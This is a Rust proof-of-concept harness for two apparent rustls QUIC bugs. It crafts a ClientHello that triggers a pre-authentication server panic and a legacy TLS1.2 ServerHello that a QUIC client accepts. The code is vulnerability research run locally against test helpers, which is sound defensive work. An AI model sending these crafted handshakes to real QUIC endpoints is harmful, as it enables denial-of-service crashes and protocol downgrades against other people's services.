// Dynamic PoC harness for two rustls findings from the 3-pass campaign (pin bd9f7f59aa79):
//   A: QUIC suite-compatibility not enforced during negotiation -> pre-auth panic (key_schedule.rs)
//   B: client accepts a TLS1.2 ServerHello on a QUIC connection (missing is_quic() guard, hs.rs:209)
// Built on rustls-test's own public helpers (encoding::*, make_server_config/make_client_config)
// so the handshake crypto is real (ring-backed), not mocked -- these are genuine end-to-end drives
// of the public API, not synthetic reproductions.
use std::borrow::Cow;
use std::panic;
use std::sync::Arc;

use rustls::crypto::{CipherSuite, CryptoProvider};
use rustls::enums::ProtocolVersion;
use rustls::quic::{self, Connection, QuicEvent};
use rustls::{SliceInput, Tls13CipherSuite};
use rustls_ring::cipher_suite::{TLS13_AES_128_GCM_SHA256, TLS13_CHACHA20_POLY1305_SHA256};
use rustls_test::{KeyType, encoding, make_client_config, make_server_config};

fn flatten_events(send: &mut impl Connection) -> Vec<u8> {
    let mut out = vec![];
    for e in send.events() {
        if let QuicEvent::Message(m) = e {
            out.extend(m);
        }
    }
    out
}

fn poc_a_mixed_suite_provider_panic() {
    println!("==== PoC A: mixed QUIC-compatibility TLS1.3 suite provider, crafted ClientHello");

    // A provider with two TLS1.3 suites: one real/quic-capable, one a byte-identical clone of a
    // different real suite except quic:None (an explicitly documented, supported provider shape
    // per Tls13CipherSuite's own doc comment: "Provide None to opt out of QUIC support for this
    // suite. It will not be offered in QUIC handshakes.").
    let good = TLS13_AES_128_GCM_SHA256;
    let bad_base = TLS13_CHACHA20_POLY1305_SHA256;
    let bad: &'static Tls13CipherSuite = Box::leak(Box::new(Tls13CipherSuite {
        common: rustls::CipherSuiteCommon {
            suite: bad_base.common.suite,
            hash_provider: bad_base.common.hash_provider,
            confidentiality_limit: bad_base.common.confidentiality_limit,
        },
        protocol_version: bad_base.protocol_version,
        hkdf_provider: bad_base.hkdf_provider,
        aead_alg: bad_base.aead_alg,
        quic: None,
    }));
    println!(
        "  good suite quic-capable: {}, bad(cloned) suite quic-capable: {}",
        good.quic.is_some(),
        bad.quic.is_some()
    );

    let mixed = CryptoProvider {
        tls13_cipher_suites: Cow::Owned(vec![good, bad]),
        ..rustls_ring::DEFAULT_PROVIDER
    };

    let server_config = Arc::new(make_server_config(KeyType::Rsa2048, &mixed));
    let mut server =
        quic::ServerConnection::new(server_config, quic::Version::V1, b"server params".to_vec())
            .expect("mixed provider must pass the >=1-quic-capable-suite construction gate");
    println!("  server constructed OK (mixed provider passed the 'any' QUIC-capability gate)");

    // Wide signature_algorithms extension (all RSA schemes ring's signer supports), since the
    // server's credential resolver must find a scheme match against a real RSA test cert.
    let wide_sig_algs = encoding::Extension {
        typ: encoding::Extension::SIGNATURE_ALGORITHMS,
        body: encoding::len_u16(encoding::vector_of(
            [
                rustls::crypto::SignatureScheme::RSA_PSS_SHA512,
                rustls::crypto::SignatureScheme::RSA_PSS_SHA384,
                rustls::crypto::SignatureScheme::RSA_PSS_SHA256,
                rustls::crypto::SignatureScheme::RSA_PKCS1_SHA512,
                rustls::crypto::SignatureScheme::RSA_PKCS1_SHA384,
                rustls::crypto::SignatureScheme::RSA_PKCS1_SHA256,
                rustls::crypto::SignatureScheme::ECDSA_NISTP256_SHA256,
            ]
            .map(|s| s.to_array()),
        )),
    };

    // Attacker's ClientHello offers ONLY the quic:None suite's wire ID.
    let mut hello = encoding::client_hello(
        ProtocolVersion::TLSv1_2,
        &[0u8; 32],
        &[0],
        vec![CipherSuite::TLS13_CHACHA20_POLY1305_SHA256],
        vec![
            encoding::Extension::new_kx_groups(),
            wide_sig_algs,
            encoding::Extension::new_versions(),
            encoding::Extension::new_dummy_key_share(),
            encoding::Extension::new_quic_transport_params(b"client params"),
        ],
    );
    println!("  crafted ClientHello: {} bytes, cipher_suites=[TLS13_CHACHA20_POLY1305_SHA256 (quic:None)]", hello.len());

    let result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
        server.read_hs(&mut SliceInput::new(&mut hello))
    }));
    match result {
        Ok(Ok(())) => println!("  NO PANIC: read_hs returned Ok(()) -- finding REFUTED for this construction"),
        Ok(Err(e)) => println!("  NO PANIC: read_hs REJECTED: {e:?} -- finding REFUTED for this construction (rejected before reaching the unwrap)"),
        Err(payload) => {
            let msg = payload
                .downcast_ref::<String>()
                .cloned()
                .or_else(|| payload.downcast_ref::<&str>().map(|s| s.to_string()))
                .unwrap_or_else(|| "<non-string panic payload>".to_string());
            println!("  >>> PANIC CONFIRMED: {msg}");
        }
    }
    println!();
}

fn poc_b_client_accepts_tls12_serverhello_on_quic() {
    println!("==== PoC B: client accepts a legacy TLS1.2 ServerHello on a QUIC connection");

    // Ordinary default (ring) provider -- has BOTH TLS1.2 and TLS1.3 suites, exactly the "not a
    // contrived setup" case the finding describes (quic::ClientConnection::new only checks TLS1.3
    // suites are QUIC-capable; it never checks TLS1.2 suites are absent).
    let provider = rustls_ring::DEFAULT_PROVIDER;
    let client_config = Arc::new(make_client_config(KeyType::Ed25519, &provider));

    let mut client = quic::ClientConnection::new(
        client_config,
        quic::Version::V1,
        "localhost".try_into().unwrap(),
        b"client params".to_vec(),
    )
    .expect("default mixed TLS1.2+1.3 provider must pass QUIC client construction");
    println!("  client constructed OK over a QUIC connection with a TLS1.2-capable provider");

    // Drain the client's own Initial ClientHello (not used further -- we substitute our own
    // malicious ServerHello instead of a real server's response).
    let _client_initial = flatten_events(&mut client);

    // Malicious/on-path server's reply: a legacy TLS1.2 ServerHello (legacy_version=0x0303, no
    // supported_versions extension so selected_version stays None and server_version resolves to
    // legacy_version per ExpectServerHello::handle), selecting a real TLS1.2 suite the client's
    // own provider supports.
    let mut server_hello = encoding::server_hello(
        ProtocolVersion::TLSv1_2,
        &[0u8; 32],
        &[0],
        CipherSuite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
        vec![],
    );
    println!("  crafted legacy TLS1.2 ServerHello (no supported_versions ext): {} bytes", server_hello.len());

    let result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
        client.read_hs(&mut SliceInput::new(&mut server_hello))
    }));
    match result {
        Ok(Ok(())) => println!(
            "  ACCEPTED: client processed the TLS1.2 ServerHello on its QUIC connection with no error \
             -- it is now running the TLS1.2 state machine over QUIC (missing is_quic() guard confirmed \
             reachable). The debug_assert! panic fires further down this same TLS1.2 flow, at the first \
             ChangeCipherSpec emission (ExpectServerDone::handle_input -> emit_ccs -> Quic::send_msg)."
        ),
        Ok(Err(e)) => println!("  REJECTED at ServerHello: {e:?} -- finding REFUTED for this construction"),
        Err(payload) => {
            let msg = payload
                .downcast_ref::<String>()
                .cloned()
                .or_else(|| payload.downcast_ref::<&str>().map(|s| s.to_string()))
                .unwrap_or_else(|| "<non-string panic payload>".to_string());
            println!("  >>> PANIC at ServerHello step already: {msg}");
        }
    }
    println!();
}

fn main() {
    poc_a_mixed_suite_provider_panic();
    poc_b_client_accepts_tls12_serverhello_on_quic();
    println!("TEST-EXIT=0");
}
